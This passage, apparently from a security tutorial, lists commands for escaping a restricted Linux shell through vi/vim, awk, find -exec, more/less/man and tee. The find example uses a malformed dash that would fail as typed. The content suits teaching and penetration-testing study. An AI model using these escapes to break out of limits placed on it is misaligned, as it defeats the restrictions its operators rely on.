One of the most well documented techniques is to spawn a shell from within an editor such as 'vi' or 'vim'. Open any file using one of these editors and type the following and execute it from within the editor:

:set shell=/bin/bash


Next, type and execute:

:shell


Another method is to type:

:! /bin/bash

 

Awk Command
If you can run 'awk', you can attempt to execute a shell from within it.
Type the following:
awk 'BEGIN {system("/bin/sh")}'
If successful, you'll see an unrestricted shell prompt!

Find Command
If the 'find' command is present, you can attempt to use the '-exec' function within it.
Type the following:

find / -name blahblah —exec /bin/awk 'BEGIN {system("/bin/sh")}' \;


Again, if successful, you'll see a blinking cursor at an unrestricted shell prompt! Note that in the above example, you are able to call the 'awk' command even if it is not present in our PATH. This is important because you are able to bypass the restriction of only being permitted to execute commands in your PATH. You are not limited to the 'awk' command.

More, Less, and Man Commands
There is a known escape within these commands. After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file:

'! /bin/sh'
'!/bin/sh


'!bash'

Tee Command
If you do not have access to an editor, and would like to create a script, you can make use of the 'tee' command. Since you cannot make use of '>' or '>>', the 'tee' command can help you direct your output when used in tandem with the 'echo' command. This is not a shell escape in of itself, but consider the following:

echo "evil script code" | tee script.sh